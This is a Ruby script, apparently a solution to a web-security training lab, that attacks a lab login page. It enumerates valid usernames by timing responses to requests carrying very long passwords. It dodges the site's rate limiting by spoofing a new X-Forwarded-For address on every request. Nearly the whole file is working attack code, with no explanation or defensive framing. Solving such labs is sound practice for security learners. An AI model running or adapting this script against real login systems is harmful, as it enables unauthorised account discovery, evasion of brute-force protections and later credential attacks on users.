# frozen_string_literal: true

require 'uri'
require 'net/http'
require './bypass_waf'

TARGET = 'https://0a56002803b6b48bc17aaa1c00a30021.web-security-academy.net/login'

uri = URI(TARGET)

USERNAMES = 'username_list.txt'

# Username Enumeration
candidates = ['autodiscover'] # seeding last name incase it's the one
spoofed_ip = BypassWAF.new
memo = {}
File.readlines(USERNAMES).each do |line|
  candidates << line.strip
  loop do
    break if candidates.length <= 1

    c = candidates.shift
    start = Time.now
    res = Net::HTTP.post(
      uri,
      "username=#{c}&password='testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttestte" \
      'testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttestxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',
      'Content-Type' => 'application/x-www-form-urlencoded', 'X-Forwarded-For' => spoofed_ip.to_s
    )
    elapsed = Time.now - start
    puts 'Rate-Limited' if res.body.include?(
      '<p class=is-warning>You have made too many incorrect login attempts. Please try again in 30 minute(s).</p>'
    )
    puts "Tried: #{c}\telapsed: #{elapsed}\tX-Forwarded-For:#{spoofed_ip}\tCode:#{res.code}"
    spoofed_ip.increment
    next unless elapsed > 1

    candidates << c
    memo[c] = memo.fetch(c, 0) + 1
    # puts "memo: #{memo}"
  end
  break if memo.fetch(candidates[0], 0) > 3
end

puts candidates
